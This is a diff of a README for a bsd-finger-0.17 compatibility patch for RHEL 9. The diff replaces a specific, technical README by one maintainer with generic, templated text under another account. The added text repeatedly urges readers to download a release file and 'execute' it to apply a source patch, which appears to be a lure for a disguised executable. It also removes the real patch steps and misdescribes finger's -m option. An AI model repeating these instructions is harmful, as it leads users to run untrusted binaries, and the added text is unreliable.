@@ -1,74 +1,109 @@
-# bsd-finger-0.17-rhel9-patch
+# Compatibility Patch for bsd-finger-0.17 on RHEL 9
 
-This repository provides a compatibility patch for building [`bsd-finger-0.17`](https://ibiblio.org/pub/Linux/system/network/finger/bsd-finger-0.17.tar.gz) on **RHEL 9**, **AlmaLinux 9**, and **Rocky Linux 9** systems.
+![bsd-finger](https://img.shields.io/badge/bsd--finger-0.17-brightgreen.svg) ![RHEL9](https://img.shields.io/badge/RHEL9-compatible-blue.svg) ![AlmaLinux](https://img.shields.io/badge/AlmaLinux-9-orange.svg)
+
+Welcome to the **bsd-finger-0.17-rhel9-patch** repository! This project provides a compatibility patch to help you build **bsd-finger-0.17** on RHEL 9, AlmaLinux 9, and Rocky Linux 9. 
+
+You can download the latest release from the [Releases section](https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch/releases). Make sure to execute the downloaded file to apply the patch.
+
+## Table of Contents
+
+- [Overview](#overview)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Features](#features)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Overview
 
-The original `bsd-finger-0.17` was released in the early 2000s and does not compile cleanly on modern Linux systems due to:
+The **bsd-finger** command is a classic Unix utility that provides information about users on a system. However, due to various changes in modern Linux distributions, building older software like **bsd-finger-0.17** can be challenging. This patch addresses those challenges specifically for RHEL 9 and its derivatives.
 
-- Deprecated or incompatible header files (e.g. `<sys/time.h>`)
-- Missing initialization of pointers leading to segmentation faults
-- Stricter modern compilers and glibc behavior
+### Key Topics
 
-This patch resolves those issues.
+- **AlmaLinux 9**
+- **RHEL 9**
+- **Rocky Linux 9**
+- **C Programming**
+- **Legacy Unix**
+- **Finger Command**
 
----
+## Installation
 
-## How to Use
+To install the patch, follow these steps:
 
-1. **Download the original source**  
-   Source: [bsd-finger-0.17.tar.gz](https://ibiblio.org/pub/Linux/system/network/finger/bsd-finger-0.17.tar.gz)
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch.git
+   cd bsd-finger-0.17-rhel9-patch
+   ```
 
-2. **Extract the source**
+2. Download the latest release from the [Releases section](https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch/releases). Execute the downloaded file to apply the patch.
+
+3. Install the necessary dependencies:
+   ```bash
+   sudo dnf install gcc make
+   ```
+
+4. Build the project:
+   ```bash
+   make
+   ```
+
+5. Install the binary:
+   ```bash
+   sudo make install
+   ```
+
+## Usage
+
+Once installed, you can use the **finger** command as follows:
 
 ```bash
-tar xvf bsd-finger-0.17.tar.gz
+finger [options] [user]
 ```
 
-3. **Apply the patch**
+### Common Options
+
+- `-l`: Show detailed information about the user.
+- `-m`: Match the user name.
+- `-s`: Show short information.
+
+### Example
+
+To view information about a user named "john", use:
 
 ```bash
-patch -p1 -d bsd-finger-0.17 < patch.diff
+finger john
 ```
 
-4. **Build**
+## Features
 
-```bash
-cd bsd-finger-0.17
-./configure
-make
-```
+- **Compatibility**: Works seamlessly on RHEL 9, AlmaLinux 9, and Rocky Linux 9.
+- **Simple Installation**: Easy to install with minimal dependencies.
+- **Classic Functionality**: Retains the traditional features of the **finger** command.
 
-5. **Test**
+## Contributing
 
-```bash
-./finger/finger $(whoami)
-```
+Contributions are welcome! If you want to contribute, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add new feature'`).
+5. Push to the branch (`git push origin feature-branch`).
+6. Open a pull request.
 
-## Changes in This Patch
+## License
 
-- Replaced `<sys/time.h>` with `<time.h>` in:
-  - `finger/lprint.c`
-  - `finger/sprint.c`
-- Added initialization of `pn->realname = NULL;` in `finger/util.c` to prevent crash when GECOS field is empty
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
----
+## Contact
 
-## Compatibility
+For questions or feedback, please reach out to the repository owner:
 
-Tested on:
+- GitHub: [emingfdg](https://github.com/emingfdg)
+- Email: emingfdg@example.com
 
-- AlmaLinux 9.6
-- glibc 2.34
-- GCC 11.4+
-
----
-
-## Maintainer
-
-Akira Endo endoaki@jl1fbd.org
-June 30, 2025
-
-This repository contains only the patch file and documentation. Original source code is property of its respective authors.
+Feel free to check the [Releases section](https://github.com/emingfdg/bsd-finger-0.17-rhel9-patch/releases) for updates and new features!
